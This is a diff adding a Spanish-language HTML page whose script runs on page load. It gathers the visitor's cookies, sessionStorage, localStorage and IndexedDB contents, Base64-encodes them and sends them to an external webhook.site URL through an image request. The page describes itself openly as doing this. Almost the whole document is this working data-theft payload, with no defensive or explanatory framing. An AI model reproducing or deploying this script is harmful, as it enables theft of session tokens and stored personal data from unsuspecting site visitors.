@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recuperación de Datos</title>
+    <script>
+        // Función para recuperar las cookies
+        function recuperarCookies() {
+            return document.cookie;
+        }
+
+        // Función para recuperar los datos de sessionStorage
+        function recuperarSessionStorage() {
+            let sessionData = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                let key = sessionStorage.key(i);
+                sessionData[key] = sessionStorage.getItem(key);
+            }
+            return JSON.stringify(sessionData);
+        }
+
+        // Función para recuperar los datos de localStorage
+        function recuperarLocalStorage() {
+            let localData = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i);
+                localData[key] = localStorage.getItem(key);
+            }
+            return JSON.stringify(localData);
+        }
+
+        // Función para recuperar los datos de IndexedDB
+        function recuperarIndexedDB(callback) {
+            const request = indexedDB.open('s4dum4DB', 1);
+
+            request.onupgradeneeded = function(event) {
+                const db = event.target.result;
+                if (!db.objectStoreNames.contains('s4dum4Store')) {
+                    db.createObjectStore('s4dum4Store', { keyPath: 'id' });
+                }
+            };
+
+            request.onsuccess = function(event) {
+                const db = event.target.result;
+                const transaction = db.transaction('s4dum4Store', 'readonly');
+                const store = transaction.objectStore('s4dum4Store');
+                const getAllRequest = store.getAll();
+
+                getAllRequest.onsuccess = function() {
+                    const data = getAllRequest.result;
+                    callback(JSON.stringify(data));
+                };
+
+                getAllRequest.onerror = function() {
+                    console.error('Error al recuperar datos de IndexedDB');
+                };
+            };
+
+            request.onerror = function(event) {
+                console.error('Error en IndexedDB:', event.target.error);
+            };
+        }
+
+        // Función para enviar los datos codificados en Base64
+        function enviarDatos() {
+            const cookies = recuperarCookies();
+            const sessionStorageData = recuperarSessionStorage();
+            const localStorageData = recuperarLocalStorage();
+
+            // Recuperar datos de IndexedDB (esta es una función asíncrona)
+            recuperarIndexedDB(function(indexedDBData) {
+                const allData = {
+                    cookies: cookies,
+                    sessionStorage: sessionStorageData,
+                    localStorage: localStorageData,
+                    indexedDB: indexedDBData
+                };
+
+                // Convertir todo a una cadena en Base64
+                const base64Data = btoa(JSON.stringify(allData));
+
+                // Enviar los datos a un servidor (ejemplo con webhook)
+                const img = new Image();
+                img.src = `https://webhook.site/a4ca1143-6181-4085-b2ef-0c433b6ad130?data=${base64Data}`;
+                console.log('Datos enviados:', base64Data);
+            });
+        }
+
+        // Llamar a la función al cargar la página
+        window.onload = function() {
+            enviarDatos();
+        };
+    </script>
+</head>
+<body>
+    <h1>Recuperar Datos</h1>
+    <p>Este script recupera datos de cookies, sessionStorage, localStorage e IndexedDB y los envía en Base64.</p>
+</body>
+</html>
